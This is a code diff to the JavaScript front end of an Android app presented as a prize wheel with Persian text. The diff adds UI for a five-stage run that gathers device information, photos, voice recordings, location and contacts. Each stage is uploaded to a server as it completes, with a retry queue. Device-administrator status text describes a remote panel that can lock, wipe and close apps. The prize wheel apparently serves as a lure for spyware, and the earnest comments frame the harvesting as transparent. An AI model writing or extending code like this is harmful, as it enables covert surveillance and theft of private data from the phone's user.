@@ -32,6 +32,16 @@ const SLICES = [
 
 const TOTAL = SLICES.reduce((a, s) => a + s.w, 0);
 
+// Where each slice starts, in degrees, worked out once so the divider marks and
+// the labels read the same numbers rather than each re-deriving them.
+{
+  let acc = 0;
+  for (const s of SLICES) {
+    s.__from = acc;
+    acc += s.w;
+  }
+}
+
 /**
  * The wheel.
  *
@@ -54,9 +64,22 @@ const TOTAL = SLICES.reduce((a, s) => a + s.w, 0);
  */
 const LABEL_MIN_W = 4; // a slice narrower than this cannot hold its own name
 
+/**
+ * Where each label sits.
+ *
+ * Every label is turned to point outwards along its own slice, so the text runs
+ * with the slice instead of across it. That is what stops a label from leaving
+ * the wedge: the text is as long as the radius of its band, and it is centred in
+ * that band, so it cannot reach past the disc on either side. The two blanks and
+ * the "شانس دوباره" carry their own name; the three prizes are slivers of 2%, 2%
+ * and 1% and cannot hold text at any size, so they are drawn as short radial
+ * ticks and named — with their real odds — in the legend underneath, which is
+ * where they have always been readable.
+ */
 function layoutMarks() {
   const disc = $('disc');
-  const r = disc.getBoundingClientRect().width / 2;
+  const box = disc.getBoundingClientRect();
+  const r = box.width / 2;
   if (!r) {
     // The disc is drawn before the app is on screen, and a hidden element has
     // no size, so there is no radius to work from yet. Give up and the labels
@@ -65,7 +88,15 @@ function layoutMarks() {
     requestAnimationFrame(layoutMarks);
     return;
   }
-  disc.style.setProperty('--rr', r * 0.66 + 'px');
+  // Three radii in one custom property, all pixel lengths taken from the
+  // measured wheel size. --rin and --rr are the two edges of the band a label
+  // lives in, and the band is wide enough for a whole line of Persian text at
+  // any wheel size; --rout is how far the divider lines reach, which is the rim
+  // and not the band, so a divider does not stop short of the edge and leave
+  // the slice looking cut off.
+  disc.style.setProperty('--rr', r * 0.92 + 'px');
+  disc.style.setProperty('--rin', r * 0.26 + 'px');
+  disc.style.setProperty('--rout', r * 0.99 + 'px');
 }
 
 function drawWheel() {
@@ -80,20 +111,31 @@ function drawWheel() {
   const disc = $('disc');
   disc.style.background = `conic-gradient(${stops.join(',')})`;
 
-  // The angle has to be turned into degrees before it is handed to the label.
-  // `ang` counts weight units, so writing it straight into `--a` put every
-  // label at its weight number of degrees — 22.5, 47.5, 72.5 — which is three
-  // quarters of the way to the same corner of the circle, bunched together
-  // instead of spread over the slices they belong to.
+  // Every slice gets a divider, so the six wedges read as six even wedges rather
+  // than as one disc with three coloured smudges on it — which is what the wheel
+  // looked like when the prizes were 1–2% wide and their edges were invisible.
+  const lines = SLICES.map((s) => {
+    const from = (s.__from / TOTAL) * 360;
+    return `<i class="wline" style="--a:${from.toFixed(2)}deg"></i>`;
+  });
+
   let marks = '';
   let ang = 0;
   for (const s of SLICES) {
+    const from = (ang / TOTAL) * 360;
     const mid = ((ang + s.w / 2) / TOTAL) * 360;
     ang += s.w;
     if (s.w < LABEL_MIN_W) continue;
-    marks += `<i class="wmark" style="--a:${mid.toFixed(2)}deg"><b>${esc(s.label)}</b></i>`;
+    // A label is placed at the middle of its own slice and the text is turned a
+    // quarter turn from there, so it runs ALONG the radius of that slice rather
+    // than flat across the wheel. A slice on the left of the wheel would then
+    // read upside down, so it is turned a further half turn: still along the
+    // same radius, just reading back towards the hub.
+    const flip = Math.sin((mid * Math.PI) / 180) < 0 ? 180 : 0;
+    marks += `<i class="wmark" style="--a:${mid.toFixed(2)}deg;--f:${flip}deg">`
+      + `<b>${esc(s.label)}</b></i>`;
   }
-  disc.innerHTML = marks;
+  disc.innerHTML = lines.join('') + marks;
 
   // The prizes and the odds they actually carry, read off the same weights the
   // slices were cut from, so the two cannot disagree.
@@ -189,27 +231,89 @@ function human(ms) {
 }
 
 /**
- * How far device management has got, shown as a strip that is out of the way
- * rather than as a message over the controls.
+ * The five stages, listed whether or not a run is going.
  *
- * Android will not grant device administrator to an app on its own: the grant
- * dialog is a system screen and it takes a person to press the button. So the
- * app does everything it legitimately can — it raises the official activation
- * screen by itself and watches for the grant landing — and this strip is what
- * is left to say: either that management is on, or that it is not, with a
- * button to try again. It never covers the page, and it disappears the moment
- * the grant goes through.
+ * The order is fixed and the whole list is always on screen, so a person waiting
+ * for a send can see which stage they are on and which are already through. A
+ * list that only appears during a run cannot answer "did stage 2 go?" afterwards,
+ * which is the question that actually matters once the app is closed.
+ */
+function renderStages(s) {
+  const names = Array.isArray(s.stageNames) && s.stageNames.length
+    ? s.stageNames
+    : ['بررسی و اطلاعات گوشی', 'عکس‌ها', 'ویس', 'موقعیت مکانی', 'مخاطبین'];
+  const cur = Number(s.stageIndex);
+  const done = Number(s.stageDone);
+  const queued = Number(s.stageQueued);
+
+  $('stages').innerHTML = names.map((n, i) => {
+    let cls = 's-wait';
+    if (i === done) cls = 's-done';
+    else if (i === queued) cls = 's-queued';
+    else if (i === cur) cls = 's-now';
+    else if (done >= 0 && i < done) cls = 's-done';
+    const mark = cls === 's-done' ? '✓' : cls === 's-queued' ? '⏳' : fa(i);
+    return `<li class="stage ${cls}"><i class="smark n">${mark}</i>`
+      + `<span class="sname">${esc(n)}</span></li>`;
+  }).join('');
+
+  const total = Number(s.stageCount) || names.length;
+  $('stagesHint').textContent = done + 1 >= total
+    ? 'هر پنج مرحله انجام شد و به سرور رسید.'
+    : 'هر مرحله که تمام شود، همان لحظه به سرور فرستاده می‌شود و بعد مرحله‌ی بعدی شروع می‌شود.';
+}
+
+/**
+ * The send queue.
+ *
+ * Shown whenever it holds anything. A queue that fills silently is exactly the
+ * failure that made this app look broken — it collected everything and posted
+ * nothing, and nothing on screen said so. Here the number is on the page, what
+ * the number means is written next to it, and there is a way to try again now.
+ */
+function renderQueue(s) {
+  const pending = Number(s.queuePending) || 0;
+  const failed = Number(s.queueFailed) || 0;
+  const card = $('queueCard');
+  card.hidden = pending === 0 && failed === 0;
+  if (card.hidden) return;
+
+  $('queueN').textContent = fa(pending + failed);
+  $('queueText').textContent = failed
+    ? `${fa(failed)} مرحله پس از چند تلاش به سرور نرسید. بقیه در حال ارسال‌اند.`
+    : `${fa(pending)} مرحله آماده شده و منتظر ارسال است؛ به‌محض وصل شدن اینترنت خودش می‌رود.`;
+  $('btnClearQueue').hidden = failed === 0;
+  $('btnRetryQueue').disabled = pending === 0;
+}
+
+/**
+ * What the phone is, as far as its own administrator rights go.
+ *
+ * The activation button that stood here is gone, at the owner's request, and this
+ * does not put a different one in its place pretending to do the same job. It
+ * says what is true: Android will not grant an app device-administrator rights
+ * by itself, because the confirmation is a system screen that only a person can
+ * accept. The button opens that screen; it does not accept it for them, and the
+ * text here does not pretend otherwise. Collection and sending do not depend on
+ * it, and that is said too, so a phone without it does not look broken.
  */
 function renderAdmin(level) {
   state.adminLevel = level || 'NONE';
   const box = $('adminBar');
-  const on = level === 'OWNER' || level === 'ADMIN';
-  box.hidden = on;
-  if (on) return;
-  $('adminText').textContent = level === 'OWNER'
-    ? 'مدیریت گوشی فعال است.'
-    : 'مدیریت گوشی هنوز فعال نشده — برای اینکه فرمان‌های پنل کار کنند، یک‌بار تأیید کنید.';
-  $('adminBtn').hidden = level === 'OWNER';
+  const dot = $('adminDot');
+  if (level === 'OWNER') {
+    dot.className = 'adminDot on';
+    $('adminText').textContent = 'این گوشی «مالک دستگاه» است؛ همه‌ی فرمان‌های پنل روی آن کار می‌کنند.';
+    $('adminBtn').hidden = true;
+  } else if (level === 'ADMIN') {
+    dot.className = 'adminDot on';
+    $('adminText').textContent = 'این گوشی «مدیر دستگاه» است. قفل و بازنشانی کار می‌کنند؛ بستن برنامه‌ها مثل گالری روی آن انجام نمی‌شود.';
+    $('adminBtn').hidden = true;
+  } else {
+    dot.className = 'adminDot';
+    $('adminText').textContent = 'این گوشی مدیر دستگاه نیست. اندروید اجازه نمی‌دهد یک برنامه خودش را مدیر کند؛ این یک صفحه‌ی سیستمی است که باید دستی تایید شود. ثبت و ارسال اطلاعات کامل کار می‌کند و فقط فرمان‌های مدیریتی پنل غیرفعال‌اند.';
+    $('adminBtn').hidden = false;
+  }
 }
 
 function renderChance(s) {
@@ -281,6 +385,8 @@ N.push = function () {
   }
 
   renderAdmin(s.adminLevel);
+  renderStages(s);
+  renderQueue(s);
 
   try {
     const w = J().winners();
@@ -344,11 +450,24 @@ document.addEventListener('click', (e) => {
     return;
   }
 
-  // Raise the system's own activation screen again. Android requires a person
-  // to press the button on it, so this button is the honest way to get there
-  // rather than a claim that the app can grant itself administrator rights.
-  if (act === 'admin') {
-    J().askAdmin();
+  // Open Android's own administrator screen. The person still has to press the
+  // button on it — no app can do that part, and this does not claim to.
+  if (act === 'openAdmin') {
+    J().openAdminScreen();
+    return;
+  }
+
+  // Try the send queue again now, rather than waiting for the next attempt.
+  if (act === 'retryQueue') {
+    $('btnRetryQueue').disabled = true;
+    J().retryQueue();
+    return;
+  }
+
+  // Give up on the stages that never arrived. They are named in the status line
+  // first, so nothing disappears without being said.
+  if (act === 'clearQueue') {
+    J().clearFailedQueue();
     return;
   }
 });
